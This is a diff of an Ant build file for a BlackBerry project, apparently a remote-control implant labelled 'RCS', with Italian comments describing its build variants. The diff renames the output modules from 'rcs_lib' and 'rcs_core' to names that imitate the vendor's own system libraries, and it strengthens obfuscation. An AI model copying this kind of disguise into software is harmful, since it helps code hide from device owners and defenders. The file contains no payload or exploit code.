@@ -20,13 +20,21 @@
 	<property name="ht.vendor" value="RIM" />
 	<property name="ht.version" value="1.0" />
 
-	<property name="lib.codename" value="rcs_lib" />
-	<property name="core.codename" value="rcs_core" />
+	<property name="lib.codename" value="net_rim_bb_lib_base" />
+	<property name="core.codename" value="net_rim_bb_lib" />
 
-	<!-- Symbols -->
-	<property name="preprocess.debug.symbols" value="DEBUG,DBC,DEMO,FAKECONF" />
-	<property name="preprocess.demo.symbols" value="DEMO,RELEASE" />
-	<property name="preprocess.release.symbols" value="RELEASE" />
+	<!-- Symbols 
+	DEBUG: versione con i log di debug su file
+	RELEASE: versione strippata e offuscata
+	DBC: verifiche Design by contract
+	FAKECONF: configurazione presa da codice
+	DEMO: versione demo, a meno di binary patch
+	NODEMO: inibisce la demo.
+	
+	-->
+	<property name="preprocess.debug.symbols" value="DEBUG,NODEMO,DBC,FAKECONF" />
+	<property name="preprocess.test.symbols" value="TEST" />
+	<property name="preprocess.release.symbols" value="RELEASE,DEMO" />
 
 	<!-- Sources -->
 	<property name="lib.src" location="RCSBlackBerryResources/src" />
@@ -72,12 +80,13 @@
 		<attribute name="dir.src" />
 		<attribute name="dir.to" />
 		<attribute name="preprocess.symbols" default="" />
+		<attribute name="exclude" default="**/tests/" />
 		<sequential>
 			<echo message="=== Preprocess @{dir.src} => @{dir.to} ===" />
 			<mkdir dir="@{dir.to}" />
 			<copy todir="@{dir.to}">
 				<fileset dir="@{dir.src}">
-					<exclude name="**/tests/" />
+					<exclude name="@{exclude}" />
 				</fileset>
 			</copy>
 			<replace dir="@{dir.to}" token="//#preprocess" value="//!preprocess" />
@@ -109,7 +118,13 @@
 			<preprocess dir.src="${lib.src}" dir.to="${builddir}/preprocessed" />
 
 			<!-- Compile everything, but don't preverify (yet). -->
-			<wtkbuild srcdir="${builddir}/preprocessed" destdir="${builddir}/unverified" preverify="false" />
+			<wtkbuild srcdir="${builddir}/preprocessed" destdir="${builddir}/unverified" preverify="false">
+				<classpath>
+					<path id="lib.classpath">
+						<path location="${net_rim_api.jar}" />
+					</path>
+				</classpath>
+			</wtkbuild>
 
 			<!-- Package our newly compiled classes. -->
 			<wtkpackage jarfile="${builddir}/lib.jar" jadfile="${builddir}/lib.jad">
@@ -118,13 +133,15 @@
 			</wtkpackage>
 
 			<!-- Preverify -->
-			<wtkpreverify jarfile="${builddir}/lib.jar" jadfile="${builddir}/lib.jad" />
+			<wtkpreverify jarfile="${builddir}/lib.jar" jadfile="${builddir}/lib.jad">
+				<classpath refid="lib.classpath" />
+			</wtkpreverify>
 
 			<!-- Rapc -->
 			<mkdir dir="output/@{version}" />
-			<wtkrapc jadfile="${builddir}/lib.jad" source="${builddir}/lib.jar" codename="${lib.codename}" import="${net_rim_api.jar}" destdir="output/@{version}" midlet="false" library="true" />			
-			
-			<copy file="${builddir}/lib.jar" tofile="output/@{version}/${lib.codename}.jar"/>
+			<wtkrapc jadfile="${builddir}/lib.jad" source="${builddir}/lib.jar" codename="${lib.codename}" import="${net_rim_api.jar}" destdir="output/@{version}" midlet="false" library="true" />
+
+			<copy file="${builddir}/lib.jar" tofile="output/@{version}/${lib.codename}.jar" />
 			<move todir="${builddir}">
 				<fileset dir=".">
 					<include name="${lib.codename}*" />
@@ -173,12 +190,23 @@
 			</manifest>
 
 			<!-- Preprocess. -->
-			<preprocess dir.src="${core.src}" dir.to="${builddir}/preprocessed" preprocess.symbols="@{preprocess.symbols}" />
+			<if>
+				<equals arg1="@{kind}" arg2="test" />
+				<then>
+					<echo message="Test preprocess" />
+					<preprocess dir.src="${core.src}" dir.to="${builddir}/preprocessed" preprocess.symbols="@{preprocess.symbols}" exclude="" />
+				</then>
+				<else>
+					<echo message="Normal preprocess" />
+					<preprocess dir.src="${core.src}" dir.to="${builddir}/preprocessed" preprocess.symbols="@{preprocess.symbols}" />
+				</else>
+			</if>
+
 
 			<!-- Compile everything, but don't preverify (yet). -->
 			<echo>lib: "output/@{version}/${lib.codename}.jar" </echo>
 			<wtkbuild srcdir="${builddir}/preprocessed" destdir="${builddir}/unverified" preverify="true" bootclasspath="${net_rim_api.jar}">
-				
+
 				<classpath>
 					<path id="core.classpath">
 						<path location="${net_rim_api.jar}" />
@@ -193,13 +221,13 @@
 				<fileset dir="${core.src}/../res" includes="**/*.png" />
 			</wtkpackage>
 
-			<!-- Obfuscate -->
+			<!-- Obfuscate -dontshrink -->
 			<wtkobfuscate jarfile="${builddir}/core.jar" jadfile="${builddir}/core.jad" if="false">
 				<classpath refid="core.classpath" />
 				<argument value="'-keep public class blackberry.Main{
 							public static void main(java.lang.String[]);
 							}'" />
-				<argument value="-dontshrink -dontusemixedcaseclassnames -dontnote -repackageclasses 'bin' -overloadaggressively -allowaccessmodification -microedition" />
+				<argument value="-shrink -dontusemixedcaseclassnames -dontnote -repackageclasses 'blackberry' -overloadaggressively -allowaccessmodification -microedition" />
 			</wtkobfuscate>
 
 			<!-- Preverify -->
@@ -210,16 +238,16 @@
 			<!-- Rapc 
 			<wtkrapc jadfile="${builddir}/core.jad" source="${builddir}/core.jar" codename="${core.codename}" import="${net_rim_api.jar};output/@{version}/lib.jar" destdir="${builddir}" quiet="true" midlet="false" library="false" />
 			-->
-			
+
 			<exec dir="${builddir}" executable="${bb.buildjars.home}/rapc.exe" failonerror="true">
-			    <arg value="-quiet"/>
-			    <arg value="import=${net_rim_api.jar}"/>
-			    <arg value="codename=${core.codename}"/>
-			    <arg file="${builddir}/core.rapc"/>
-			    <arg file="${builddir}/core.jar"/> 
-				<arg file="output/@{version}/${lib.codename}.jar"/> 				
-			</exec>			
-			
+				<arg value="-quiet" />
+				<arg value="import=${net_rim_api.jar}" />
+				<arg value="codename=${core.codename}" />
+				<arg file="${builddir}/core.rapc" />
+				<arg file="${builddir}/core.jar" />
+				<arg file="output/@{version}/${lib.codename}.jar" />
+			</exec>
+
 			<copy file="preprocess/signature.csl" tofile="${builddir}/${core.codename}.csl" />
 			<copy file="preprocess/signature.cso" tofile="${builddir}/${core.codename}.cso" />
 			<move todir="${builddir}">
@@ -255,17 +283,17 @@
 		</sequential>
 	</macrodef>
 
-
+	<!-- list="45,50" -->
 	<target name="build">
-		<for list="45,50" param="version">
+		<for list="45" param="version">
 			<sequential>
-	            <echo message="==============" />
-	            <echo message="===  BUILD === ------------------------------------------------------------" />
-	            <echo message="==============" />
+				<echo message="==============" />
+				<echo message="===  BUILD === ------------------------------------------------------------" />
+				<echo message="==============" />
 				<echo>Version @{version}</echo>
-				<local name="jde.local.home"/>
+				<local name="jde.local.home" />
 				<propertycopy name="jde.local.home" from="jde.@{version}.home" />
-				<var name="jde.home" value="${jde.local.home}"/>
+				<var name="jde.home" value="${jde.local.home}" />
 				<var name="net_rim_api.jar" value="${jde.home}/lib/net_rim_api.jar" />
 				<var name="bb.buildjars.home" value="${jde.home}/bin" />
 
@@ -273,11 +301,22 @@
 
 				<libbuild version="@{version}" preprocess.symbols="${preprocess.release.symbols}" />
 
+				<echo message="_____________" />
+				<echo message="     DEBUG   " />
 				<corebuild kind="debug" version="@{version}" preprocess.symbols="${preprocess.debug.symbols}" />
 
-				<!--
-				<corebuild kind="demo" version="@{version}" preprocess.symbols="${preprocess.demo.symbols}" />
+				<echo message="_____________" />
+				<echo message="    RELEASE  " />
 				<corebuild kind="release" version="@{version}" preprocess.symbols="${preprocess.release.symbols}" />
+
+				<!--
+				<echo message="_____________" />
+				<echo message="     TEST    " />
+				<corebuild kind="test" version="@{version}" preprocess.symbols="${preprocess.test.symbols}" />
+				
+				<echo message="_____________" />
+                <echo message="     DEMO    " />
+				<corebuild kind="demo" version="@{version}" preprocess.symbols="${preprocess.demo.symbols}" />				
 				-->
 			</sequential>
 		</for>
@@ -294,5 +333,40 @@
 			<arg value="output/45/debug//${lib.codename}.cod" />
 			<arg value="output/45/debug/${core.codename}.cod" />
 		</exec>
+	</target>
+
+
+	<property name="blackberry.simulator.path" location="${jde.45.home}\simulator" />
+	<property name="simulator.model" value="8300" />
+
+	<!-- To run the application in simulator
+	PS C:\Users\fabrizio\blackberry\Workspace> C:\Developer\eclipse_bb\plugins\net.rim.ejde.componentpack4.5.0_4.5.0.28\components\simulator\
+	fledgecontroller.exe /session=8300
+	Pause(5)
+    RemoteCallCreation("555-1234")
+    Pause(2)
+    ThumbwheelPress
+    ThumbwheelRelease
+    Pause(10)
+    KeyPress(ESCAPE)
+    Pause(2)
+    KeyRelease(ESCAPE)
+    Exit
+
+    http://docs.blackberry.com/en/developers/deliverables/606/BlackBerry_Device_Simulator_User_Guide.pdf
+	-->
+	<target name="simulator" description="Run in ${simulator.model} Simulator">
+		
+			<exec dir="${blackberry.simulator.path}" executable="${blackberry.simulator.path}/fledge.exe" spawn="true">
+				<arg line=" /app=Jvm.dll " />
+				<arg line=" /handheld=${simulator.model} " />
+				<arg line=" /session=${simulator.model} " />
+				<arg line=" /app-param=DisableRegistration " />
+				<arg line=" /app-param=JvmAlxConfigFile:${simulator.model}.xml " />
+				<arg line=" /data-port=0x4d44 " />
+				<arg line=" /data-port=0x4d4e " />
+				<arg line=" /pin=0x2100000A " />
+			</exec>
+		
 	</target>
 </project>
